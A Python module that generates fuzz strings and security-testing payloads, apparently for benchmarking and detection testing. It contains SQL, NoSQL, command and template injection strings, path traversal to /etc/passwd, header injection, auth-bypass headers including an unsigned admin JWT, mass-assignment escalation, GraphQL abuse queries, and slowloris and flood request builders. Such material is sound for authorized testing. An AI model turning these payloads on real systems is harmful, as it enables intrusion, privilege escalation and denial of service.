"""Payload Generator -- HTTP, API, Fuzz, Network, DB payload factory"""
import random, string, json, base64, urllib.parse, struct, os

# -- Fuzz primitives ----------------------------------------------------------

FUZZ_STRINGS = [
    # boundary / overflow
    "A" * 100, "A" * 1000, "A" * 10000,
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x%x%x",
    "\\x00" * 16, "\\xff" * 16,
    # format string
    "%d%d%d%d", "%.99999d", "%n%n%n%n",
    # unicode / encoding
    "\xef\xbf\xbe", "\xef\xbf\xbf",
    "\xe3\x82\xa1\xe3\x82\xa2\xe3\x82\xa3",
    # whitespace / special
    "\t\n\r", "     ", "\x0b\x0c",
    # number edge cases
    "0", "-1", "2147483647", "2147483648", "-2147483648",
    "9999999999999999", "0x7FFFFFFF", "0xFFFFFFFF",
    "NaN", "Infinity", "-Infinity", "1e308", "1e-308",
    # injection snippets (for detection testing)
    "'; DROP TABLE users;--",
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "$(id)",
    "../../../etc/passwd",
    "\\x41\\x41\\x41\\x41",
    "\r\nHeader: injected",
    "%0d%0aHeader: injected",
]

CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "multipart/form-data; boundary=----Boundary",
    "text/xml",
    "application/xml",
    "application/graphql",
    "text/plain",
    "application/octet-stream",
]

# -- HTTP payloads ------------------------------------------------------------

def http_random_body(size=512):
    return os.urandom(size)

def http_json_body(depth=2, width=4):
    def gen(d):
        if d == 0:
            return random.choice([
                random.randint(-9999, 9999),
                ''.join(random.choices(string.ascii_letters, k=8)),
                True, False, None,
            ])
        return {f"key_{i}": gen(d - 1) for i in range(width)}
    return json.dumps(gen(depth))

def http_form_body(fields=None):
    if not fields:
        fields = {
            f"field{i}": ''.join(random.choices(string.ascii_letters, k=8))
            for i in range(random.randint(3, 8))
        }
    return urllib.parse.urlencode(fields)

def http_multipart_body(boundary="----Boundary"):
    parts = []
    for i in range(3):
        name = f"field{i}"
        val  = ''.join(random.choices(string.printable, k=64))
        parts.append(
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}"
        )
    parts.append(f"--{boundary}--")
    return "\r\n".join(parts)

def http_xml_body():
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<root>'
        f'<id>{random.randint(1,9999)}</id>'
        f'<name>{"".join(random.choices(string.ascii_letters, k=8))}</name>'
        f'<value>{random.random()}</value>'
        '</root>'
    )

def http_oversized_header(size=8192):
    return "X" * size

def http_malformed_headers():
    return [
        {"Content-Length": "-1"},
        {"Content-Length": "9999999999"},
        {"Transfer-Encoding": "chunked", "Content-Length": "0"},
        {"Host": "localhost\r\nX-Injected: pwned"},
        {"X-Forwarded-For": ", ".join(["127.0.0.1"] * 30)},
        {"Accept": ", ".join([f"text/html;q={i/100:.2f}" for i in range(99, 0, -1)])},
        {"Cookie": "; ".join([f"session{i}=val{i}" for i in range(50)])},
        {"Authorization": "Bearer " + "A" * 4096},
    ]

def http_encoding_variants(payload):
    enc = payload.encode() if isinstance(payload, str) else payload
    return {
        "raw":        payload,
        "url":        urllib.parse.quote(payload),
        "double_url": urllib.parse.quote(urllib.parse.quote(payload)),
        "base64":     base64.b64encode(enc).decode(),
        "base64url":  base64.urlsafe_b64encode(enc).decode(),
        "hex":        enc.hex(),
        "html_ent":   payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;"),
    }

def http_payloads(n=20):
    """Return n varied HTTP body payloads for benchmarking."""
    pool = []
    per_type = max(1, n // 5)
    for _ in range(per_type):
        pool.append(("application/json", http_json_body()))
        pool.append(("application/x-www-form-urlencoded", http_form_body()))
        pool.append(("text/xml", http_xml_body()))
        pool.append(("application/octet-stream", http_random_body(random.randint(64, 2048)).hex()))
        pool.append(("application/json", json.dumps({"fuzz": random.choice(FUZZ_STRINGS)})))
    return pool[:n]

# -- API payloads -------------------------------------------------------------

def api_rest_payload(method="POST"):
    base = {
        "username": ''.join(random.choices(string.ascii_lowercase, k=8)),
        "email":    f"{''.join(random.choices(string.ascii_lowercase, k=6))}@test.com",
        "password": ''.join(random.choices(string.printable.strip(), k=12)),
        "id":       random.randint(1, 9999),
        "role":     random.choice(["user", "admin", "moderator", "guest"]),
    }
    if method in ("PUT", "PATCH"):
        return {k: v for k, v in list(base.items())[:random.randint(1, 3)]}
    return base

def api_graphql_payloads():
    return [
        '{"query":"{ __typename }"}',
        '{"query":"{ __schema { types { name } } }"}',
        '{"query":"query { users { id email role password } }"}',
        '{"query":"mutation { login(username:\\"admin\\" password:\\"admin\\") { token } }"}',
        # depth bomb
        '{"query":"{ a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }"}',
        # alias overload
        '{"query":"{' + " ".join([f"u{i}:user(id:{i}){{id}}" for i in range(100)]) + '}"}',
        # sensitive field probe
        '{"query":"{ user(id: 1) { id email phone address ssn creditCard bankAccount } }"}',
    ]

def api_idor_ids():
    """IDs to probe for IDOR testing."""
    return (
        list(range(1, 11)) +
        [100, 999, 1000, 9999, 10000, 99999, 2**31 - 1, 2**32 - 1] +
        [f"00{i}" for i in range(1, 6)] +
        ["null", "undefined", "0", "-1", "true", "false"]
    )

def api_mass_assign_payloads():
    return [
        {"role": "admin"},
        {"is_admin": True},
        {"admin": True},
        {"isAdmin": True},
        {"permissions": ["*"]},
        {"verified": True},
        {"email_verified": True},
        {"balance": 999999},
        {"credits": 999999},
        {"premium": True},
        {"subscription": "enterprise"},
        {"_isAdmin": True},
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
    ]

def api_auth_headers():
    """Auth bypass header sets."""
    return [
        {},
        {"Authorization": "null"},
        {"Authorization": "undefined"},
        {"Authorization": "Bearer null"},
        {"Authorization": "Bearer "},
        {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]

def api_payloads():
    return {
        "rest":        [api_rest_payload(m) for m in ("GET", "POST", "PUT", "PATCH", "DELETE")],
        "graphql":     api_graphql_payloads(),
        "idor_ids":    api_idor_ids(),
        "mass_assign": api_mass_assign_payloads(),
        "auth_bypass": api_auth_headers(),
    }

# -- Network / TCP / UDP payloads ---------------------------------------------

def net_tcp_payload(size=64):
    return os.urandom(size)

def net_http_get(host, path="/"):
    return f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

def net_http_flood_line(host, path="/"):
    return f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n".encode()

def net_slowloris_header(host):
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: BenchmarkBot/1.0\r\n"
        f"Accept: */*\r\n"
        f"X-Bench-{random.randint(1000,9999)}: "
    ).encode()

def net_malformed_packets():
    return [
        b"",
        b"\x00" * 1024,
        b"\xff" * 1024,
        b"GET / HTTP/9.9\r\n\r\n",
        b"INVALID_METHOD / HTTP/1.1\r\n\r\n",
        b"GET /" + b"A" * 8192 + b" HTTP/1.1\r\n\r\n",
        b"GET / HTTP/1.1\r\n" + b"X-Header: " + b"B" * 8192 + b"\r\n\r\n",
        struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 6, 0,
                    b"\x7f\x00\x00\x01", b"\x7f\x00\x00\x01"),
    ]

def net_udp_payloads():
    return [os.urandom(size) for size in [1, 64, 512, 1024, 4096, 65507]]

def net_payloads(host="localhost"):
    return {
        "tcp":        [net_tcp_payload(s) for s in [64, 256, 1024, 4096]],
        "http_get":   [net_http_get(host, p) for p in ["/", "/api", "/admin", "/health"]],
        "http_flood": [net_http_flood_line(host)],
        "slowloris":  [net_slowloris_header(host)],
        "malformed":  net_malformed_packets(),
        "udp":        net_udp_payloads(),
    }

# -- DB payloads --------------------------------------------------------------

def db_sql_payloads():
    return [
        {"q": "SELECT 1"},
        {"q": f"SELECT * FROM users WHERE id = {random.randint(1, 1000)}"},
        {"q": f"SELECT u.*, o.* FROM users u JOIN orders o ON u.id=o.user_id WHERE u.id={random.randint(1,100)}"},
        {"q": "SELECT COUNT(*), AVG(price), MAX(price) FROM products GROUP BY category"},
        {"q": f"SELECT * FROM users WHERE id IN ({','.join(str(i) for i in random.sample(range(1,10000),100))})"},
        {"q": f"SELECT * FROM products WHERE name LIKE '%{''.join(random.choices(string.ascii_lowercase,k=4))}%'"},
        {"q": f"SELECT * FROM logs ORDER BY id DESC LIMIT 100 OFFSET {random.randint(10000,100000)}"},
        {"q": "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 100)"},
    ]

def db_nosql_payloads():
    return [
        {"username": {"$gt": ""}},
        {"username": {"$regex": ".*"}},
        {"username": {"$ne": "null"}},
        {"password": {"$exists": True}},
        {"$where": "this.credits > 0"},
        {"username": {"$in": ["admin", "root", "administrator"]}},
        {"$or": [{"username": "admin"}, {"role": "admin"}]},
    ]

def db_payloads():
    return {
        "sql":   db_sql_payloads(),
        "nosql": db_nosql_payloads(),
    }

# -- Master factory -----------------------------------------------------------

def generate(vector="all", host="localhost", n=20):
    if vector == "http":  return http_payloads(n)
    if vector == "api":   return api_payloads()
    if vector == "net":   return net_payloads(host)
    if vector == "db":    return db_payloads()
    if vector == "fuzz":  return FUZZ_STRINGS
    return {
        "http": http_payloads(n),
        "api":  api_payloads(),
        "net":  net_payloads(host),
        "db":   db_payloads(),
        "fuzz": FUZZ_STRINGS,
    }
